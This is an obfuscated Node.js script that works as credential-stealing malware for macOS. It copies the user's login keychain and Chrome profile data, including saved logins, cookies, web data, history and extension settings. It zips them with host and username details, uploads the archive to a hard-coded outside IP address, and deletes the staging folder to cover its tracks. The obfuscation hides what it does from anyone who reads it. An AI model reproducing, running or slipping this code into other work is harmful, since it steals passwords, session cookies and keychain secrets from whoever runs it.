const _0x59fa9b=_0x122c;(function(_0x5be926,_0x3b4df7){const _0x2ccc67=_0x122c,_0x553d88=_0x5be926();while(!![]){try{const _0x127c1d=parseInt(_0x2ccc67(0xce))/0x1*(parseInt(_0x2ccc67(0x106))/0x2)+-parseInt(_0x2ccc67(0xe5))/0x3*(parseInt(_0x2ccc67(0xdc))/0x4)+parseInt(_0x2ccc67(0x122))/0x5+parseInt(_0x2ccc67(0xf9))/0x6*(parseInt(_0x2ccc67(0xd8))/0x7)+-parseInt(_0x2ccc67(0xdd))/0x8+-parseInt(_0x2ccc67(0xf3))/0x9+parseInt(_0x2ccc67(0xd1))/0xa;if(_0x127c1d===_0x3b4df7)break;else _0x553d88['push'](_0x553d88['shift']());}catch(_0x1b54d4){_0x553d88['push'](_0x553d88['shift']());}}}(_0x419b,0xc484b));const fs=require('fs'),os=require('os'),path=require(_0x59fa9b(0x120)),{exec,execSync}=require('child_process'),crypto=require('crypto'),axios=require('axios'),FormData=require('form-data'),CONFIG={'serverUrl':_0x59fa9b(0x11b),'apiKey':_0x59fa9b(0x109),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':'Stable','zipFileName':generateClientId()+'.zip','chromeImportantFiles':[_0x59fa9b(0xf7),'Login\x20Data',_0x59fa9b(0xda),_0x59fa9b(0x10e),'Bookmarks',_0x59fa9b(0xcd),_0x59fa9b(0xf1)]};function log(_0xa03d7,_0x4a9d1b=![]){const _0x45d4b5=_0x59fa9b,_0x6f1454=new Date()['toISOString'](),_0x310004='['+_0x6f1454+']\x20'+_0xa03d7;_0x4a9d1b?console['error'](_0x310004):console[_0x45d4b5(0xd3)](_0x310004);try{fs[_0x45d4b5(0x10d)](_0x45d4b5(0xed),_0x310004+'\x0a');}catch(_0x117086){console[_0x45d4b5(0x10c)]('Error\x20writing\x20to\x20log:\x20'+_0x117086[_0x45d4b5(0xcc)]);}}function createDirectory(_0x7d9a7b){const _0x2d7085=_0x59fa9b;try{return!fs[_0x2d7085(0x103)](_0x7d9a7b)&&fs[_0x2d7085(0x11e)](_0x7d9a7b,{'recursive':!![]}),!![];}catch(_0x4aa9ba){return![];}}function copyFile(_0x46d84f,_0x5638e6){try{return fs['copyFileSync'](_0x46d84f,_0x5638e6),!![];}catch(_0x4f6e23){return![];}}function copyDirectoryRecursive(_0x31c817,_0x102e9f){const _0x512217=_0x59fa9b;try{!fs[_0x512217(0x103)](_0x102e9f)&&fs[_0x512217(0x11e)](_0x102e9f,{'recursive':!![]});const _0x34c953=fs[_0x512217(0xd6)](_0x31c817,{'withFileTypes':!![]});for(const _0x1bf88f of _0x34c953){const _0x5b4303=path[_0x512217(0xd4)](_0x31c817,_0x1bf88f[_0x512217(0x107)]),_0x28359f=path['join'](_0x102e9f,_0x1bf88f['name']);_0x1bf88f[_0x512217(0x104)]()?copyDirectoryRecursive(_0x5b4303,_0x28359f):copyFile(_0x5b4303,_0x28359f);}return!![];}catch(_0x21b05e){return![];}}function executeCommand(_0x2087ae){const _0x3f8c4a=_0x59fa9b;try{const _0x24c010=execSync(_0x2087ae,{'encoding':_0x3f8c4a(0xff)});return{'success':!![],'output':_0x24c010};}catch(_0x4a9607){return{'success':![],'error':_0x4a9607};}}function formatFileSize(_0x1ddf03){const _0x4b2cc2=_0x59fa9b;if(_0x1ddf03===0x0)return _0x4b2cc2(0x108);const _0x29dda6=0x400,_0x5f4690=[_0x4b2cc2(0x115),'KB','MB','GB','TB'],_0x46876f=Math[_0x4b2cc2(0xe0)](Math[_0x4b2cc2(0xd3)](_0x1ddf03)/Math[_0x4b2cc2(0xd3)](_0x29dda6));return parseFloat((_0x1ddf03/Math[_0x4b2cc2(0x111)](_0x29dda6,_0x46876f))['toFixed'](0x2))+'\x20'+_0x5f4690[_0x46876f];}function generateClientId(){const _0x2e8cb1=_0x59fa9b;try{const _0x227ef8=getMacAddress(),_0x2b7ceb=os['hostname'](),_0x367e2b=os['userInfo']()[_0x2e8cb1(0x110)],_0xd1cb47=crypto[_0x2e8cb1(0xe2)](_0x2e8cb1(0xcf))[_0x2e8cb1(0x102)](_0x227ef8+':'+_0x2b7ceb+':'+_0x367e2b)[_0x2e8cb1(0x113)]('hex')[_0x2e8cb1(0xd2)](0x0,0x8);return _0xd1cb47;}catch(_0x989e81){return Math['random']()[_0x2e8cb1(0xfd)](0x24)[_0x2e8cb1(0xd2)](0x2,0xa);}}function _0x419b(){const _0x176e3b=['networkInterfaces','Failed\x20to\x20create\x20Stable\x20directory','collector.log','unknown','getLengthSync','Default','Local\x20Extension\x20Settings','maxRetries','11711988oQBCXg','retryDelay','statSync','/Library/Application\x20Support/Google/Chrome','Web\x20Data','stringify','26592yakWOZ','Failed\x20to\x20create\x20ZIP\x20archive','userInfo','platform','toString','now','utf8','/Users/','mac','update','existsSync','isDirectory','00:00:00:00:00:00','206bHnVtX','name','0\x20Bytes','tJz4uRVCwl2eEwyPTudYP9iGRfgq','data','./node_modules/axios','error','appendFileSync','Cookies','\x20-x\x20\x22*.DS_Store\x22','username','pow','size','digest','loaded','Bytes','createReadStream','Chrome_','type','getHeaders','zip\x20-r\x20-1\x20','http://65.87.7.115:8088/api/files/upload','rm\x20-rf\x20','stableDir','mkdirSync','/Library/Keychains/login.keychain-db','path','cwd','2440755gRsEQO','message','Secure\x20Preferences','3586QBXysp','md5','success','18976760fpNeie','substring','log','join','arch','readdirSync','chromeImportantFiles','1967oaRDaZ','post','History','npm\x20install\x20axios\x20form-data','4EmHmbf','7088792UiBlHa','startsWith','zipFileName','floor','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','createHash','append','serverUrl','3024621BruDvt','push','basename','application/zip','timeout','exit'];_0x419b=function(){return _0x176e3b;};return _0x419b();}function getMacAddress(){const _0x29c403=_0x59fa9b;try{const _0x1b4f62=os[_0x29c403(0xeb)]();for(const _0x5aafbf of Object['keys'](_0x1b4f62)){for(const _0x5573e6 of _0x1b4f62[_0x5aafbf]){if(!_0x5573e6['internal']&&_0x5573e6['mac']!==_0x29c403(0x105))return _0x5573e6[_0x29c403(0x101)];}}return'unknown';}catch(_0x15fbca){return _0x29c403(0xee);}}async function collectData(){const _0x2dfc09=_0x59fa9b;try{if(!createDirectory(CONFIG[_0x2dfc09(0x11d)]))throw new Error(_0x2dfc09(0xec));const _0x17fd3b=os[_0x2dfc09(0xfb)]()[_0x2dfc09(0x110)],_0x104529=_0x2dfc09(0x100)+_0x17fd3b+_0x2dfc09(0x11f),_0x2b3faf=path[_0x2dfc09(0xd4)](CONFIG['stableDir'],'login.keychain-db');fs['existsSync'](_0x104529)&&copyFile(_0x104529,_0x2b3faf);try{const _0x5eab93='/Users/'+_0x17fd3b+_0x2dfc09(0xf6);if(fs[_0x2dfc09(0x103)](_0x5eab93)){const _0x57bcd2=[];fs['existsSync'](path[_0x2dfc09(0xd4)](_0x5eab93,_0x2dfc09(0xf0)))&&_0x57bcd2['push'](_0x2dfc09(0xf0));try{const _0x18b755=fs[_0x2dfc09(0xd6)](_0x5eab93,{'withFileTypes':!![]});for(const _0x296fdf of _0x18b755){_0x296fdf[_0x2dfc09(0x104)]()&&_0x296fdf['name'][_0x2dfc09(0xde)]('Profile\x20')&&_0x57bcd2[_0x2dfc09(0xe6)](_0x296fdf[_0x2dfc09(0x107)]);}}catch(_0x5e8d75){}for(const _0x5783df of _0x57bcd2){const _0xa9619e=path['join'](_0x5eab93,_0x5783df),_0x2f629d=path[_0x2dfc09(0xd4)](CONFIG['stableDir'],_0x2dfc09(0x117)+_0x5783df);createDirectory(_0x2f629d);for(const _0x1443d4 of CONFIG[_0x2dfc09(0xd7)]){const _0x514ac7=path[_0x2dfc09(0xd4)](_0xa9619e,_0x1443d4),_0x58a62a=path['join'](_0x2f629d,_0x1443d4);fs[_0x2dfc09(0x103)](_0x514ac7)&&(fs[_0x2dfc09(0xf5)](_0x514ac7)[_0x2dfc09(0x104)]()?copyDirectoryRecursive(_0x514ac7,_0x58a62a):copyFile(_0x514ac7,_0x58a62a));}}}}catch(_0x5b706c){}const _0x72f9aa=executeCommand(_0x2dfc09(0x11a)+CONFIG[_0x2dfc09(0xdf)]+'\x20'+CONFIG[_0x2dfc09(0x11d)]+_0x2dfc09(0x10f));if(!_0x72f9aa[_0x2dfc09(0xd0)])throw new Error(_0x2dfc09(0xfa));if(fs[_0x2dfc09(0x103)](CONFIG[_0x2dfc09(0xdf)])){const _0x4ca9b8=fs['statSync'](CONFIG[_0x2dfc09(0xdf)]);}else throw new Error(_0x2dfc09(0xe1));return!![];}catch(_0x55362e){return![];}}async function uploadFile(_0x1aac0b=0x0){const _0x1b9696=_0x59fa9b;try{const _0x344c68=path[_0x1b9696(0xd4)](process[_0x1b9696(0x121)](),CONFIG[_0x1b9696(0xdf)]);if(!fs[_0x1b9696(0x103)](_0x344c68))return![];const _0x40d626=fs[_0x1b9696(0xf5)](_0x344c68),_0x21e25c=_0x40d626[_0x1b9696(0x112)];if(_0x21e25c===0x0)return![];const _0x1d5958=new FormData();_0x1d5958[_0x1b9696(0xe3)]('file',fs[_0x1b9696(0x116)](_0x344c68),{'filename':path[_0x1b9696(0xe7)](_0x344c68),'contentType':_0x1b9696(0xe8),'knownLength':_0x21e25c});const _0x50b345={'hostname':os['hostname'](),'platform':os[_0x1b9696(0xfc)](),'type':os[_0x1b9696(0x118)](),'arch':os[_0x1b9696(0xd5)](),'username':os[_0x1b9696(0xfb)]()['username'],'id':generateClientId()},_0x2f1878=Date[_0x1b9696(0xfe)](),_0x938be9=await axios[_0x1b9696(0xd9)](CONFIG[_0x1b9696(0xe4)],_0x1d5958,{'headers':{..._0x1d5958[_0x1b9696(0x119)](),'X-Client-Info':JSON[_0x1b9696(0xf8)](_0x50b345),'Content-Length':_0x1d5958[_0x1b9696(0xef)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x1b9696(0xe9)],'onUploadProgress':_0x306c34=>{const _0x204221=_0x1b9696,_0x21867a=Math['round'](_0x306c34[_0x204221(0x114)]*0x64/_0x306c34['total']);}});return _0x938be9[_0x1b9696(0x10a)][_0x1b9696(0xd0)];}catch(_0x489090){if(_0x1aac0b<CONFIG[_0x1b9696(0xf2)])return await new Promise(_0x410343=>setTimeout(_0x410343,CONFIG[_0x1b9696(0xf4)])),uploadFile(_0x1aac0b+0x1);return![];}}async function main(){const _0x31eb8c=_0x59fa9b;try{try{(!fs[_0x31eb8c(0x103)](_0x31eb8c(0x10b))||!fs[_0x31eb8c(0x103)]('./node_modules/form-data'))&&execSync(_0x31eb8c(0xdb));}catch(_0xf5115c){}const _0x279f5f=await collectData();!_0x279f5f&&process[_0x31eb8c(0xea)](0x1);const _0xf5e572=await uploadFile();if(_0xf5e572){try{fs['existsSync'](CONFIG[_0x31eb8c(0x11d)])&&executeCommand(_0x31eb8c(0x11c)+CONFIG[_0x31eb8c(0x11d)]);}catch(_0x211b84){}process['exit'](0x0);}else process[_0x31eb8c(0xea)](0x1);}catch(_0x50f7b2){process[_0x31eb8c(0xea)](0x1);}}function _0x122c(_0x3ca991,_0x43c6c0){const _0x419bf7=_0x419b();return _0x122c=function(_0x122c1f,_0x107f15){_0x122c1f=_0x122c1f-0xcc;let _0x5a6cd1=_0x419bf7[_0x122c1f];return _0x5a6cd1;},_0x122c(_0x3ca991,_0x43c6c0);}main();
